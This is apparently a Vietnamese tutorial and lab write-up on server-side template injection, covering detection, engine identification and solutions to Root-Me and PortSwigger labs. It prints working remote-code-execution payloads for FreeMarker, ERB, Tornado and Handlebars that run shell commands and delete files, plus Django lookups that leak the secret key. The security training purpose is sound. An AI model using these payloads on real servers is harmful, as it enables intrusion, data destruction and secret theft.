# Server-side template injection 

## What is Server-side template injection (SSTI)

Template engines : là 1 công cụ giúp chúng ta tách HTML thành cách phần nhỏ hơn mà chúng ta có thể sử dụng lại trên nhiều tập tin HTML, được sử dụng bởi các ứng dụng web để trình bày dữ liệu thông qua web hoặc emails.

SSTI là 1 lỗ hổng nghiêm trọng thường bị nhầm lẫn với lỗ hổng XXSS, tuy nhiên SSTI sẽ tất công trực tiếp vào máy chủ và thường bao gồm Remote Code Execution (RCE) - thực thi mã từ xa

### Server-side template injection vulnerabilities arise

SSTI có thể phát sinh thông qua những lỗi thuộc về phía nhà phát triển vì đã không chú trọng về phẩn bảo mật hoặc những hành vi có chủ đích của template để cố gắng cung cấp những chức năng phong phú - thường được thực hiện bởi wikis, blogs, các ứng dụng tiếp thị và các hệ thống quản lý nội dung.


SSTI phát sinh khi input đầu vào của người dùng được nhúng vào các template thay vì được chuyển vào dưới dạng dữ liệu.

## Detect SSTI
### Plaintext context
- Lỗi thường sẽ xuất hiện theo một trong những phương thức sau:
```
smarty=Hello {user.name}
Hello user1
````

 Để phát hiện lỗi, chúng ta cần gọi template engine bằng cách nhúng một câu lệnh. Có một số lượng lớn các template languages nhưng phần lớn trong đó chia sẻ các đặc điểm cú pháp cơ bản. Chúng ta có thể tận dụng điều này bằng cách gửi các payload sử dụng các toán tử cơ bản để phát hiện nhiều template engine bằng 1 câu HTTP request duy nhất.

### Code context
- Dữ liệu đầu vào của người dùng cũng có thể được đặt trong một template statement, thường là tên biến
```
personal_greeting=username
Hello user01
````
Biến này thậm chí còn dễ bỏ sót hơn trong quá trình đánh giá, vì nó không dẫn đến XSS một cách rõ ràng. Thay đổi giá trị của username thường sẽ trả về kết quả rỗng hoặc gây lỗi ứng dụng. Trường hợp này có thể được phát hiện bằng cách xác minh các tham số không thể XSS trực tiếp, sau đó thoát ra khỏi template statement và thêm thẻ HTML vào sau nó :
```
personal_greeting=username<tag>
Hello
personal_greeting=username}}<tag>
Hello user01 <tag>
```

## Identify SSTI
Sau khi đã biết lỗi SSTI được phát sinh thì chúng ta phải xác định loại template engines được dùng, chúng ta có thể dựa vào hình sau đây để suy ra loại template tương ứng.



Sau khi tìm được loại template thì chúng ta có thể tham khảo các payload injection ở đây : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker---basic-injection


## Exploit
### Read
Sau khi xác định được template engine, chúng ta cần xác định tiếp theo là :

   + Cú pháp cơ bản của template engine
   + 
   + Danh sách các phương thức, hàm, bộ lọc và biến đã được dựng sẵn
   + 
   + Danh sách các tiện ích mở rộng / plugin
### Explore
Ở bước này, việc chúng ta cần làm là tìm ra chính xác những gì có thể truy cập được.

  + Xem xét cả những objects mặc định được cung cấp bởi template engine lẫn các objects dành riêng cho ứng dụng được truyền vào template bởi các nhà phát triển.
  + 
  + Bruteforce các tên biến. Các object do nhà phát triển cung cấp có khả năng chứa các thông tin nhạy cảm.
### Attack
  - Xem xét từng function để tìm các lỗ hổng có thể khai thác. Các dạng tấn công có thể là tạo object tùy ý, đọc / ghi file tùy ý (bao gồm cả remote file), hay khai thác lỗ hổng leo thang đặc quyền.


## Example
Challenge của root me : http://challenge01.root-me.org/web-serveur/ch41/

Đọc source như sau : 
```
function checkSubmit(e) {
		if (e && e.keyCode == 13) {
			checkNickname();
		}
	}

	function checkNickname() {
		var serviceUrl = "check";
		var nick = $("#nickname").val();
		var postData = "nickname=" + encodeURIComponent(nick);
		$.ajax({
			url : serviceUrl,
			type : "POST",
			data : postData,
			contentType : "application/x-www-form-urlencoded",
			dataType : "text",
			success : function(data) {
				$("#result").text(data);
			},
			error : function(data) {
				$("#result").text("An error occurs!");
			}
		});
	}
  ```
  
- Hàm này sử dụng ajax trong jquery để gửi data từ client lên server:

  + url: serviceUrl (gửi data đến url: /web-serveur/ch41/check)
  + type : "POST" (dùng POST method)
  + data : postData (data được gửi đi nằm trong biến postData)

- Nếu request thành công thì nó sẽ trả lại dữ liệu trong "data" và đổ vào thẻ div có id là "result", ngược lại thì đưa ra thông báo lỗi "An error occurs!".

- Đầu tiên, cần phải xác định loại template engine được sử dụng:


=> Báo error như ảnh thì đoán engine được dùng có thể là FreeMarker

Xem các payload trong link sau để hiểu rõ hơn : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection
```
<#assign cmd = "freemarker.template.utility.Execute"?new()>${ cmd("id")}
[#assign cmd = 'freemarker.template.utility.Execute'?new()]${ cmd('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```
[<#assign>](http://freemarker.org/docs/dgui_misc_var.html) cho phép định nghĩa biến ngay trong template . Đoạn code trên tạo một tên biến là "cmd", việc sử dụng Built-in "freemarker.template.utility.Execute"?new() cho phép tạo một object tùy ý, chính là object của "Excute" Class được implement từ "TemplateModel".

- Sử dụng payload trên để sửa nội dung input trong "nickname" khi bắt gói tin bằng Burp Suite:



## Server-side template injection Lab

### Lab: Basic server-side template injection
```
This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
```
Bài lab mô tả răng website này sử dung ERB template, điều này đã giúp chúng ta bỏ qua bước phân biệt template. Và để hoàn thành bài lab chúng ta phải xóa được file morale.txt của user Carlos.

Đầu tiên chúng ta nên tìm hiểu thêm về loại template [ERB](https://puppet.com/docs/puppet/5.5/lang_template_erb.html) ở đây. Từ đó chúng ta có thể suy ra và áp dụng [ERB cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---basic-injections) sau :
```
Ruby - Basic injections
ERB:

<%= 7 * 7 %>

```
Truy cập vào bài lab chúng ta thấy được 1 website bán hàng, và thấy được chức năng viewstock như sau:



Bắt request lại và chúng ta thấy có 1 giao thức GET /?message=.... để trả về kết quả, đây có khả năng là lỗ hổng cho chúng ta khai thác, nên chúng ta thử payload của ERB để check :
```
<%= 7 * 7 %>

```


Tuy nhiên việc thử trực tiếp như thế sẽ không được vì bị lỗi giao thức, nên chúng ta phải mã hóa sang html encoding như sau:

```
<%25%3d+7*7+%25>
```



Điều này đã xác định đây chúng là nơi có lỗi SSTI. Truy cập cheatsheet và lấy ra payload thực thi như sau, làm tương tự như lúc trước.

```
<%= system('ls') %> = > %3c%25%3d%20system('ls')%20%25%3e
```

Và ta nhận thấy được kết quả trả về có file morale.txt, tuy nhiên đề bài yêu cầu là của người dùng carlos nên chúng ta sẽ theo đường dẫn /home/carlos/morale.txt để xóa chính xác file của carlos.
```
<%= system("rm /home/carlos/morale.txt") %> => %3c%25%3d%20system("rm%20/home/carlos/morale.txt")%20%25%3e
```


Và chúng ta đã solve được bài lab.


### Lab: Basic server-side template injection (code context)
```
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
```
Lần này loại template chúng ta dùng lại là [Tornado](https://gist.github.com/jesseyv/1175064) , tương tự như thế chúng ta truy cập có thể tìm hiểu [Tornado injection](https://ajinabraham.com/blog/server-side-template-injection-in-tornado) tại đây.


Sau đó truy cập bài lab


```
}}{{7*7}}
```




```
}}{%+import+os+%}{{os.system('ls')
```


```
}}{%+import+os+%}{{os.system('rm+/home/carlos/morale.txt')
```


### Lab: Server-side template injection using documentation
```
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r
```
Lần này bài lab yêu cầu chúng ta tự tìm ra template và xóa file morale.txt của carlos để hoàn thành bài lab.



```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```



### Lab: Server-side template injection in an unknown language with a documented exploit
```
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
```





```
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```






### Lab: Server-side template injection with information disclosure via user-supplied objects
```
This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r
```





check payload 
```
{% debug %}
```


[django](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java)


```
{{settings.SECRET_KEY}}
```


### Lab: Server-side template injection in a sandboxed environment
```
This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.

You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r
```





### Lab: Server-side template injection with a custom exploit
```
This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
```
